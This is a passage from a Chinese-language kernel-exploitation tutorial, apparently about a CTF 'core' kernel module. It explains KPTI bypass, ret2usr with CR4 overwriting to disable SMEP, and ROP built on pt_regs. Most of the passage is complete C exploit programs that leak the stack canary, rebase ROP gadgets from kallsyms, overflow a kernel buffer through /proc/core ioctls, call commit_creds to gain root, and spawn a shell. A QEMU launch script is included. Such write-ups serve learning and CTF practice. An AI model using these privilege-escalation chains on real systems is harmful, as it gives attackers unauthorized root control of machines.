class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = init_cred;</span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = 0;</span></span><br><span class="line"><span class="comment">//    rop[it++] = prepare_kernel_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdx_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rcx_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = mov_rdi_rax_call_rdx;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line"></span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将 CPU 类型修改为 kvm64 后开启了 KPTI 保护。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 256M \</span><br><span class="line">  -kernel ./bzImage \</span><br><span class="line">  -initrd ./core.cpio \</span><br><span class="line">  -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \</span><br><span class="line">  -s \</span><br><span class="line">  -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -cpu kvm64,+smep,+smap</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> -cpu qemu64,+smep,+smap</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Vulnerable: Minimal generic ASM retpoline</span><br></pre></td></tr></table></figure></div>
<p>此时需要借助 <code>swapgs_restore_regs_and_return_to_usermode</code>
返回用户态。</p>
<p>该函数是内核在 <code>arch/x86/entry/entry_64.S</code>
中提供的一个用于完成内核态到用户态切换的函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81A008DA</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            swapgs_restore_regs_and_return_to_usermode += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = init_cred;</span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = 0;</span></span><br><span class="line"><span class="comment">//    rop[it++] = prepare_kernel_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdx_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rcx_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = mov_rdi_rax_call_rdx;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line"></span><br><span class="line">    rop[it++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果找不到 <code>swapgs_restore_regs_and_return_to_usermode</code>
则可以为 <code>SIGSEGV</code> 注册异常处理函数 <code>get_shell</code>
，然后按照没有 kpti
的方式返回用户态。触发异常后自动完成用户态的返回。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">signal(SIGSEGV, get_shell);</span><br></pre></td></tr></table></figure></div>
<h2 id="kernel-rop-ret2user">kernel rop + ret2user</h2>
<p>这种方法实际上是将前两种方法结合起来，同样可以绕过 smap 和 smep
包含。大体思路是先利用 rop 设置 cr4 为 0x6f0 （这个值可以通过用 cr4
原始值 &amp; 0xFFFFF 得到）关闭 smep ， 然后 iret
到用户空间去执行提权代码。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d486f8af7e7e8f373b8477295a1c222a.png"
                     
alt="在这里插入图片描述" 
                > 注意这里 smap
保护不能直接关闭，因此不能像前面 ret2usr 那样直接在 exp 中写入 trap
frame 然后栈迁移到 trap frame 的地址，而是在 rop 中构造 trap frame
结构。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_ret = <span class="number">0xffffffff81075014</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//    commit_creds(init_cred);</span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coore_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    coore_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0x00000000000006f0</span>;</span><br><span class="line">    rop[it++] = mov_cr4_rdi_ret;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="利用-pt_regs-构造-kernel-rop">利用 pt_regs 构造 kernel ROP</h2>
<p>这次我们限制溢出只能覆盖返回地址，此时需要栈迁移到其他地方构造 rop
。其中一个思路就是在 <code>pt_regs</code> 上构造 rop 。</p>
<p>我们在调用 <code>core_copy_func</code>
函数之前先将寄存器设置为几个特殊的值，然后再 <code>core_copy_func</code>
函数的返回处下断点。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x1111111111111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x2222222222222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x3333333333333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xbbbbbbbbbbbbbbbb;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0xffffffffffff0050;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x6677889A;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, core_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">        );</span><br></pre></td></tr></table></figure></div>
<p>此时可以看到 <code>pt_regs</code> 相对于栈顶的偏移为 0xF0
，除去这里的 <code>ret</code> 需要将 <code>rsp</code> 加上 0xE8
才能将栈迁移到 <code>pt_regs</code> 的起始地址。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/213698cf8f19fc866f05ce5d96363a8a.png"
                     
alt="在这里插入图片描述" 
                > <strong>另外值得注意的是
<code>pt_regs</code> 中对应 <code>r11</code> 和 <code>rcx</code>
的位置分别被写入了 <code>eflags</code>
和返回地址，因此不受我们控制。</strong></p>
<p>设置条件断点查证一下，发现在程序入口点的位置这个两个寄存器就已经被修改了。</p>
<p>借助 IDAPython 脚本在 vmlinux 中查找合适的 gadget 。</p>
